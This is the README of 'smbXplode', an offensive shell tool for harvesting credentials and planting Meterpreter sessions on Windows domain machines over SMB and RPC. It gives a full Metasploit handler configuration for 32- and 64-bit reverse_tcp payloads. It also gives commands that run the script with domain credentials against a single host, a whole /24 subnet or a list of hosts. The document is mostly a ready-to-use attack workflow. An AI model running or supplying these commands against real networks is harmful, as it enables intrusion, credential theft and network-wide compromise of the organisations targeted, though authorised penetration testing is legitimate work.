# smbXplode

This tool is used to automate the process of harvesting credentials and getting meterpreter sessions throught the smb and rpc in a windows domain.
For this to work you would need to have some kind of admin credentials to start with. or you could have some low previledge creds that you want to try them agains the whole range and try to escalate your priviledge later on. 

You can always re-adapt msfcommands.rc to automate the metasploit commands that you wanna run once you have a session. 

Also notice that due to the use of net rpc, you need to migrate first thing after a session otherwise the session would die. Unless you want to use the winexe command (which you can find commented in the script).

### Usage 
Before running this script, simply make sure that you have two payload files (32 & 64 bit). Make sure to update the name of the files accordingly in the script. 


#### Metasploit Handler
Make sure to have your Metasploit handler listening for both payloads ( you can listen two different ports for 32, and 64 ).
Also, make sure you select the correct payload for the handler, I will demonstrate the reverce_tcp (32 and 64) 

example :

```
use exploit/multi/handler
set autorunscript multi_console_command -rc /path/to/msfcommands.rc
set ExitOnSession false
set payload windows/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 1111
run -j -z
set payload windows/meterpreter/reverse_tcp
set lport 2222
run -j -z
```

Now make sure that your connect back payloads are configured to match those ports and payload type. 

#### Single Host
To run the script simply use the following syntax
```
./smbXplode.sh domain username password hostIP
```

example : 
```
./smbXplode.sh domain tito Password2015 10.10.10.10
```

#### Multiple Hosts
So far it's not really integrated into the script, as I like to keep it as simple as possible. I rely on GNU parallel to do that. 
Notice that parallel passes the IP as the last parameter already. 

example 
```
running against a /24
for i in {1..254}; do echo 10.10.10.$i; done | parallel -j 5 ./smbXplode.sh domain tito Password2015
```
```
running against host ips file
cat hosts.txt | parallel -j 5 ./smbXplode.sh domain tito Password2015
```

